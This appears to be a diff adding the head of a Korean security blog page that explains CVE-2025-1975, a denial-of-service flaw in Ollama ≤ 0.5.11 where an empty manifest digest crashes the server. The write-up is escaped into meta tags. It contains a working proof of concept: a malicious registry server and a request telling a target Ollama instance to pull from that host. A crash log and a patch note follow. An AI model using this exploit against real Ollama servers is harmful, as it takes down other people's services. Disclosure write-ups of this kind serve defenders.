@@ -1,0 +1,1054 @@
+
+
+<!DOCTYPE html>
+<html lang="ko-KR" data-default-color-scheme="&#34;auto&#34;">
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" type="image/png" href="/img/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="&lt;h2 id=&#34;URL&#34;&gt;&lt;a href=&#34;#URL&#34; class=&#34;headerlink&#34; title=&#34;URL&#34;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://huntr.com/bounties/921ba5d4-f1d0-4c66-9764-4f72dffe7acd&#34;&gt;A malicious manifests can lead to DoS due to unchecked array bound access via network in ollama/ollama in ollama/ollama&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/ollama/ollama/commit/9239a254e054d24b0de3358ba8c4bd9b50730bfd&#34;&gt;Commit 9239a25&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;Ollama &amp;#x2264; 0.5.11&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;Explain&#34;&gt;&lt;a href=&#34;#Explain&#34; class=&#34;headerlink&#34; title=&#34;Explain&#34;&gt;&lt;/a&gt;Explain&lt;/h2&gt;&lt;p&gt;&amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC740; &amp;#xC11C;&amp;#xBC84;&amp;#xAC00; &amp;#xD074;&amp;#xB77C;&amp;#xC774;&amp;#xC5B8;&amp;#xD2B8;&amp;#xC758; &amp;#xC694;&amp;#xCCAD;&amp;#xC5D0; &amp;#xC758;&amp;#xD574; &amp;#xBAA8;&amp;#xB378;&amp;#xC744; &amp;#xB2E4;&amp;#xC6B4;&amp;#xB85C;&amp;#xB4DC; &amp;#xBC1B;&amp;#xB294; pull &amp;#xC694;&amp;#xCCAD;&amp;#xC744; &amp;#xCC98;&amp;#xB9AC;&amp;#xD558;&amp;#xB294; &amp;#xACFC;&amp;#xC815;&amp;#xC5D0;&amp;#xC11C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs go&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;PullModel&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(ctx context.Context, name &lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;, regOpts *registryOptions, fn &lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt;(api.ProgressResponse)&lt;/span&gt;) &lt;span class=&#34;hljs-title&#34;&gt;error&lt;/span&gt;&lt;/span&gt; {
+	mp := ParseModelPath(name) 
+
+	&lt;span class=&#34;hljs-comment&#34;&gt;// build deleteMap to prune unused layers&lt;/span&gt;
+	deleteMap := &lt;span class=&#34;hljs-built_in&#34;&gt;make&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;map&lt;/span&gt;[&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;]&lt;span class=&#34;hljs-keyword&#34;&gt;struct&lt;/span&gt;{})
+	manifest, _, err := GetManifest(mp)
+	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; errors.Is(err, os.ErrNotExist) {
+		&lt;span class=&#34;hljs-comment&#34;&gt;// noop&lt;/span&gt;
+	} &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; err != &lt;span class=&#34;hljs-literal&#34;&gt;nil&lt;/span&gt; {
+		slog.Warn(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;pulling model with bad existing manifest&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;name&amp;quot;&lt;/span&gt;, name, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;error&amp;quot;&lt;/span&gt;, err)
+	} &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
+		&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; _, l := &lt;span class=&#34;hljs-keyword&#34;&gt;range&lt;/span&gt; manifest.Layers {
+			deleteMap[l.Digest] = &lt;span class=&#34;hljs-keyword&#34;&gt;struct&lt;/span&gt;{}{}
+		}
+		&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; manifest.Config.Digest != &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt; {
+			deleteMap[manifest.Config.Digest] = &lt;span class=&#34;hljs-keyword&#34;&gt;struct&lt;/span&gt;{}{}
+		}
+	}
+
+	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; mp.ProtocolScheme == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http&amp;quot;&lt;/span&gt; &amp;amp;&amp;amp; !regOpts.Insecure {
+		&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; errInsecureProtocol
+	}
+
+	fn(api.ProgressResponse{Status: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;pulling manifest&amp;quot;&lt;/span&gt;})
+
+	manifest, err = pullModelManifest(ctx, mp, regOpts)
+	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; err != &lt;span class=&#34;hljs-literal&#34;&gt;nil&lt;/span&gt; {
+		&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; fmt.Errorf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;pull model manifest: %s&amp;quot;&lt;/span&gt;, err)
+	}
+
+	&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; layers []Layer
+	layers = &lt;span class=&#34;hljs-built_in&#34;&gt;append&lt;/span&gt;(layers, manifest.Layers...)
+	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; manifest.Config.Digest != &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt; {
+		layers = &lt;span class=&#34;hljs-built_in&#34;&gt;append&lt;/span&gt;(layers, manifest.Config)
+	}
+
+	skipVerify := &lt;span class=&#34;hljs-built_in&#34;&gt;make&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;map&lt;/span&gt;[&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;]&lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt;)
+	&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; _, layer := &lt;span class=&#34;hljs-keyword&#34;&gt;range&lt;/span&gt; layers {
+		cacheHit, err := downloadBlob(ctx, downloadOpts{
+			mp:      mp,
+			digest:  layer.Digest,
+			regOpts: regOpts,
+			fn:      fn,
+		})
+		&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; err != &lt;span class=&#34;hljs-literal&#34;&gt;nil&lt;/span&gt; {
+			&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; err
+		}
+		skipVerify[layer.Digest] = cacheHit
+		&lt;span class=&#34;hljs-built_in&#34;&gt;delete&lt;/span&gt;(deleteMap, layer.Digest)
+	}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xBAA8;&amp;#xB378;&amp;#xC744; &amp;#xB2E4;&amp;#xC6B4; &amp;#xBC1B;&amp;#xC744; &amp;#xB54C; &amp;#xBAA8;&amp;#xB378;&amp;#xC774; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xB294; &amp;#xC11C;&amp;#xBC84;&amp;#xC5D0;&amp;#xC11C; &amp;#xBAA8;&amp;#xB378;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xC815;&amp;#xBCF4;&amp;#xB97C; manifest&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xBC1B;&amp;#xC544;&amp;#xC624;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774; &amp;#xB54C; manifest &amp;#xC548;&amp;#xC5D0; layer &amp;#xC815;&amp;#xBCF4;&amp;#xAC00; &amp;#xC788;&amp;#xACE0; &amp;#xADF8; &amp;#xC548;&amp;#xC5D0; digest &amp;#xC815;&amp;#xBCF4;&amp;#xAC00; &amp;#xD3EC;&amp;#xD568;&amp;#xB418;&amp;#xC5B4; downloadBlob &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70; &amp;#xD558;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs go&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// downloadBlob downloads a blob from the registry and stores it in the blobs directory&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;downloadBlob&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(ctx context.Context, opts downloadOpts)&lt;/span&gt; &lt;span class=&#34;hljs-params&#34;&gt;(cacheHit &lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt;, _ error)&lt;/span&gt;&lt;/span&gt; {
+
+	fp, err := GetBlobsPath(opts.digest)
+	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; err != &lt;span class=&#34;hljs-literal&#34;&gt;nil&lt;/span&gt; {
+		&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;, err
+	}
+	
+	fi, err := os.Stat(fp)
+	&lt;span class=&#34;hljs-keyword&#34;&gt;switch&lt;/span&gt; {
+	&lt;span class=&#34;hljs-keyword&#34;&gt;case&lt;/span&gt; errors.Is(err, os.ErrNotExist):
+	&lt;span class=&#34;hljs-keyword&#34;&gt;case&lt;/span&gt; err != &lt;span class=&#34;hljs-literal&#34;&gt;nil&lt;/span&gt;:
+		&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;, err
+	&lt;span class=&#34;hljs-keyword&#34;&gt;default&lt;/span&gt;:
+		opts.fn(api.ProgressResponse{
+			Status:    fmt.Sprintf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;pulling %s&amp;quot;&lt;/span&gt;, opts.digest[&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;19&lt;/span&gt;]), &lt;span class=&#34;hljs-comment&#34;&gt;// [1]&lt;/span&gt;
+			Digest:    opts.digest,
+			Total:     fi.Size(),
+			Completed: fi.Size(),
+		})
+
+		&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;nil&lt;/span&gt;
+	}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xBAA8;&amp;#xB378;&amp;#xC744; &amp;#xB2E4;&amp;#xC6B4;&amp;#xB85C;&amp;#xB4DC;&amp;#xD558;&amp;#xB294; &amp;#xACFC;&amp;#xC815;&amp;#xC5D0;&amp;#xC11C; &amp;#xBAA8;&amp;#xB378; &amp;#xC815;&amp;#xBCF4;&amp;#xB97C; &amp;#xCC98;&amp;#xB9AC;&amp;#xD560; &amp;#xB54C; digest&amp;#xC758; &amp;#xAE38;&amp;#xC774;&amp;#xAC00; 0&amp;#xC77C; &amp;#xACBD;&amp;#xC6B0;, [1]&amp;#xC5D0;&amp;#xC11C; disgest&amp;#xB97C; &amp;#xD30C;&amp;#xC2F1;&amp;#xD560; &amp;#xB54C; DoS&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC774; PoC &amp;#xC11C;&amp;#xBC84;&amp;#xB97C; &amp;#xAD6C;&amp;#xD604;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs go&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// server.go&lt;/span&gt;
+&lt;span class=&#34;hljs-keyword&#34;&gt;package&lt;/span&gt; main
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;github.com/gin-gonic/gin&amp;quot;&lt;/span&gt;
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt; {
+    gin.SetMode(gin.DebugMode)
+    r := gin.Default()
+    r.GET(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/v2/zznq/code1/manifests/latest&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(c *gin.Context)&lt;/span&gt;&lt;/span&gt; {
+        c.JSON(&lt;span class=&#34;hljs-number&#34;&gt;200&lt;/span&gt;, gin.H{
+            &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;schemaVersion&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;,
+            &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;mediaType&amp;quot;&lt;/span&gt;:     &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;application/vnd.docker.distribution.manifest.v2+json&amp;quot;&lt;/span&gt;,
+            &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;config&amp;quot;&lt;/span&gt;: gin.H{
+                &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;mediaType&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;application/vnd.docker.container.image.v1+json&amp;quot;&lt;/span&gt;,
+                &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;digest&amp;quot;&lt;/span&gt;:    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,
+                &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;size&amp;quot;&lt;/span&gt;:      &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;},
+            &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;layers&amp;quot;&lt;/span&gt;: []any{
+                gin.H{
+                    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;mediaType&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;application/vnd.ollama.image.license&amp;quot;&lt;/span&gt;,
+                    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;digest&amp;quot;&lt;/span&gt;:    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,
+                    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;size&amp;quot;&lt;/span&gt;:      &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;},
+            },
+        })
+    })
+
+    r.Run(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;localhost:8080&amp;quot;&lt;/span&gt;)
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xC704;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xC11C;&amp;#xBC84;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD55C; &amp;#xB4A4;, &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xC694;&amp;#xCCAD;&amp;#xC744; &amp;#xBCF4;&amp;#xB0B4;&amp;#xBA74; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs go&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; requests
+
+requests.post(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://{target_ollama_sever}:11434/api/pull&amp;quot;&lt;/span&gt;, json={&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;model&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://{malicious_server}:8080/zznq/code1&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;insecure&amp;quot;&lt;/span&gt;: True})&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Crash log:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs go&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;2025&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;02&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;15&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;08&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;25&lt;/span&gt; routes.&lt;span class=&#34;hljs-keyword&#34;&gt;go&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;1186&lt;/span&gt;: INFO server config env=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;map[HTTPS_PROXY: HTTP_PROXY: NO_PROXY: OLLAMA_DEBUG:false OLLAMA_FLASH_ATTENTION:false OLLAMA_GPU_OVERHEAD:0 OLLAMA_HOST:http://127.0.0.1:11434 OLLAMA_KEEP_ALIVE:5m0s OLLAMA_KV_CACHE_TYPE: OLLAMA_LLM_LIBRARY: OLLAMA_LOAD_TIMEOUT:5m0s OLLAMA_MAX_LOADED_MODELS:0 OLLAMA_MAX_QUEUE:512 OLLAMA_MODELS:/Users/whoami/.ollama/models OLLAMA_MULTIUSER_CACHE:false OLLAMA_NOHISTORY:false OLLAMA_NOPRUNE:false OLLAMA_NUM_PARALLEL:0 OLLAMA_ORIGINS:[http://localhost https://localhost http://localhost:* https://localhost:* http://127.0.0.1 https://127.0.0.1 http://127.0.0.1:* https://127.0.0.1:* http://0.0.0.0 https://0.0.0.0 http://0.0.0.0:* https://0.0.0.0:* app://* file://* tauri://* vscode-webview://*] OLLAMA_SCHED_SPREAD:false http_proxy: https_proxy: no_proxy:]&amp;quot;&lt;/span&gt;
+time=&lt;span class=&#34;hljs-number&#34;&gt;2025&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;-02&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;-15&lt;/span&gt;T00:&lt;span class=&#34;hljs-number&#34;&gt;08&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;25.225&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;-08&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; level=INFO source=images.&lt;span class=&#34;hljs-keyword&#34;&gt;go&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;432&lt;/span&gt; msg=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;total blobs: 0&amp;quot;&lt;/span&gt;
+time=&lt;span class=&#34;hljs-number&#34;&gt;2025&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;-02&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;-15&lt;/span&gt;T00:&lt;span class=&#34;hljs-number&#34;&gt;08&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;25.225&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;-08&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; level=INFO source=images.&lt;span class=&#34;hljs-keyword&#34;&gt;go&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;439&lt;/span&gt; msg=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;total unused blobs removed: 0&amp;quot;&lt;/span&gt;
+time=&lt;span class=&#34;hljs-number&#34;&gt;2025&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;-02&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;-15&lt;/span&gt;T00:&lt;span class=&#34;hljs-number&#34;&gt;08&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;25.225&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;-08&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; level=INFO source=routes.&lt;span class=&#34;hljs-keyword&#34;&gt;go&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;1237&lt;/span&gt; msg=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Listening on 127.0.0.1:11434 (version 0.5.11)&amp;quot;&lt;/span&gt;
+time=&lt;span class=&#34;hljs-number&#34;&gt;2025&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;-02&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;-15&lt;/span&gt;T00:&lt;span class=&#34;hljs-number&#34;&gt;08&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;25.244&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;-08&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; level=INFO source=types.&lt;span class=&#34;hljs-keyword&#34;&gt;go&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;130&lt;/span&gt; msg=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;inference compute&amp;quot;&lt;/span&gt; id=&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; library=metal variant=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt; compute=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt; driver=&lt;span class=&#34;hljs-number&#34;&gt;0.0&lt;/span&gt; name=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt; total=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;10.7 GiB&amp;quot;&lt;/span&gt; available=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;10.7 GiB&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;hljs-built_in&#34;&gt;panic&lt;/span&gt;: runtime error: slice bounds out of &lt;span class=&#34;hljs-keyword&#34;&gt;range&lt;/span&gt; [:&lt;span class=&#34;hljs-number&#34;&gt;19&lt;/span&gt;] with length &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
+
+goroutine &lt;span class=&#34;hljs-number&#34;&gt;12&lt;/span&gt; [running]:
+github.com/ollama/ollama/server.downloadBlob({&lt;span class=&#34;hljs-number&#34;&gt;0x101739c40&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x1400052c640&lt;/span&gt;}, {{{&lt;span class=&#34;hljs-number&#34;&gt;0x10133fc9a&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x5&lt;/span&gt;}, {&lt;span class=&#34;hljs-number&#34;&gt;0x14000419c80&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xe&lt;/span&gt;}, {&lt;span class=&#34;hljs-number&#34;&gt;0x14000419c8f&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x4&lt;/span&gt;}, {&lt;span class=&#34;hljs-number&#34;&gt;0x14000419c94&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x5&lt;/span&gt;}, ...}, ...})
+    /Users/runner/work/ollama/ollama/server/download.&lt;span class=&#34;hljs-keyword&#34;&gt;go&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;478&lt;/span&gt; +&lt;span class=&#34;hljs-number&#34;&gt;0x508&lt;/span&gt;
+github.com/ollama/ollama/server.PullModel({&lt;span class=&#34;hljs-number&#34;&gt;0x101739c40&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x1400052c640&lt;/span&gt;}, {&lt;span class=&#34;hljs-number&#34;&gt;0x14000419c80&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;}, &lt;span class=&#34;hljs-number&#34;&gt;0x1400052ac00&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x14000502450&lt;/span&gt;)
+    /Users/runner/work/ollama/ollama/server/images.&lt;span class=&#34;hljs-keyword&#34;&gt;go&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;564&lt;/span&gt; +&lt;span class=&#34;hljs-number&#34;&gt;0x600&lt;/span&gt;
+github.com/ollama/ollama/server.(*Server).PullHandler.func1()
+    /Users/runner/work/ollama/ollama/server/routes.&lt;span class=&#34;hljs-keyword&#34;&gt;go&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;593&lt;/span&gt; +&lt;span class=&#34;hljs-number&#34;&gt;0x174&lt;/span&gt;
+created by github.com/ollama/ollama/server.(*Server).PullHandler in goroutine &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;
+    /Users/runner/work/ollama/ollama/server/routes.&lt;span class=&#34;hljs-keyword&#34;&gt;go&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;580&lt;/span&gt; +&lt;span class=&#34;hljs-number&#34;&gt;0x528&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xD574;&amp;#xB2F9; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC758; &amp;#xD328;&amp;#xCE58;&amp;#xB294; digest&amp;#xAC00; &amp;#xBE48;&amp;#xBB38;&amp;#xC790;&amp;#xC5F4;&amp;#xC778;&amp;#xC9C0; &amp;#xC5EC;&amp;#xBD80;&amp;#xB97C; &amp;#xAC80;&amp;#xC0AC;&amp;#xD558;&amp;#xB3C4;&amp;#xB85D; &amp;#xC218;&amp;#xC815;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+ - hack &amp; life">
+  <meta name="author" content="j0dev, y2sman">
+  <meta name="keywords" content>
+  <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
+  <meta name="naver-site-verification" content="0b4fea742ed293b82621684e466d9f26c3ccee06">
+
+
+  <meta property="og:type" content="website"> 
+  <meta property="og:title" content="[하루한줄] CVE-2025-1975 : Ollama의 배열 인덱스 검증 미흡으로 인한 Denial of Service(DoS) 취약점 - hackyboiz">
+  <meta property="og:description" content="&lt;h2 id=&#34;URL&#34;&gt;&lt;a href=&#34;#URL&#34; class=&#34;headerlink&#34; title=&#34;URL&#34;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://huntr.com/bounties/921ba5d4-f1d0-4c66-9764-4f72dffe7acd&#34;&gt;A malicious manifests can lead to DoS due to unchecked array bound access via network in ollama/ollama in ollama/ollama&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/ollama/ollama/commit/9239a254e054d24b0de3358ba8c4bd9b50730bfd&#34;&gt;Commit 9239a25&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;Ollama &amp;#x2264; 0.5.11&lt;/li&gt;
+&lt;/ul&gt;
